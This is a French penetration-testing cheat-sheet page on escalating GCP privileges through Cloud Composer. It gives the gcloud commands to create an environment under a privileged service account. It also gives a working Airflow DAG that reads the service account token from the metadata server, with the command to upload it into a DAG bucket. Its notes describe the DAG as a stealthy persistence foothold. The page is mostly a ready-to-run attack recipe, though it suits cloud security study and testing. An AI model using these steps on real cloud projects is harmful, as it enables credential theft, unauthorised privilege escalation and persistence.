---
title: "Cloud Composer : actAs un compte de service via un DAG Airflow"
description: "Créer ou modifier un environnement ou un DAG Cloud Composer (Airflow) pour qu'une tâche s'exécute sous le compte de service de l'environnement."
keywords:
  - Cloud Composer
  - Airflow
  - DAG
  - environment service account
  - actAs
---

# Cloud Composer

Cloud Composer exécute Apache Airflow managé, et chaque tâche s'exécute sous le **compte de service** de l'environnement. Avec `composer.environments.create` (plus `iam.serviceAccounts.actAs` sur un SA privilégié), vous montez un environnement lié à ce compte ; avec un accès en écriture au bucket de DAG d'un environnement existant, vous déposez un DAG qui s'exécute sous son SA. Dans les deux cas, une tâche Airflow devient du code arbitraire sous le compte de service.

## Créer un environnement avec un compte de service choisi

```bash
gcloud composer environments create env1 --location us-central1 \
  --service-account <privileged-sa>@<proj>.iam.gserviceaccount.com
```

## Déposer un DAG dans un environnement existant

Le bucket de DAG est un bucket GCS normal ; écrivez un DAG et il s'exécute à la prochaine planification sous le SA de l'environnement :

```python
# dag.py -> upload to the environment's dags/ bucket
from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime
with DAG("x", start_date=datetime(2024,1,1), schedule_interval="@once") as d:
    BashOperator(task_id="t",
        bash_command="curl -s -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
```

```bash
gcloud composer environments storage dags import \
  --environment env1 --location us-central1 --source dag.py
```

## Notes d'exploitation

- Le SA de l'environnement est fréquemment étendu (Editor du projet par défaut), donc le token que le DAG affiche est souvent une escalade importante.
- Modifier un DAG est discret et durable : il se ré-exécute à la planification, un point d'ancrage de persistance autant qu'une escalade.
- `actAs` est le verrou sur `environments create` ; un environnement existant où vous pouvez écrire des DAG ne nécessite qu'un accès au bucket.

## Outils

- **gcloud** (`composer environments`) : créer et importer des DAG.
- **gsutil** : écrire directement dans le bucket de DAG.

## Références

- [GCP IAM privilege escalation (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud: GCP Composer privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google : contrôle d'accès Cloud Composer](https://cloud.google.com/composer/docs)
